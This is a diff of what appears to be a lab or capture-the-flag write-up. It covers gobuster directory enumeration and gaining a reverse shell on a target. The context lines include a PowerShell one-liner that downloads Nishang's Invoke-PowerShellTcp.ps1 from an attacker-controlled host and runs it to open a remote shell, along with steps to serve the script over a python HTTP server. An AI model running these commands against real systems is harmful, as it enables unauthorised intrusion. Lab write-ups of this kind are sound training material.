@@ -104,7 +104,7 @@ admin:admin	    302	        /
 ```
 gobuster dir -u http://TARGET-IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -x php,txt,html -e -k
 
-wordlist 800,000 long, target slows down never completing even with t 10, t 1 might work but target would time out. This was as good as it got. So blacklist ports added for further filtering. 
+wordlist 800,000 long, target slows down never completing even with t 10, t 100 might work but target would time out. This was as good as it got. So blacklist ports added for further filtering. 
 
 gobuster dir -u http://<targetIP>:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html -e -k --status-codes-blacklist 404,403,302,301>GobusterOutput.txt
 
@@ -139,15 +139,17 @@ nothing really usable.
 
 
 ## Q3: Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: 
+
 Answer: not required
 ```
 powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
 ```
 You first need to download the Powershell script and make it available for the server to download. You can do this by creating an http server with python: python3 -m http.server
+
 Answer: no response required.
 
 This requires the use of Nishang tool kit mentioned earlier. 
-Download, go to shells folder and start a python3 htt.server to allow download from server end.
+Download, go to shells folder and start a python3 -m http.server to allow download from server end.
 ```
 root@ip-10-49-76-50:~# git clone https://github.com/samratashok/nishang
 Cloning into 'nishang'...
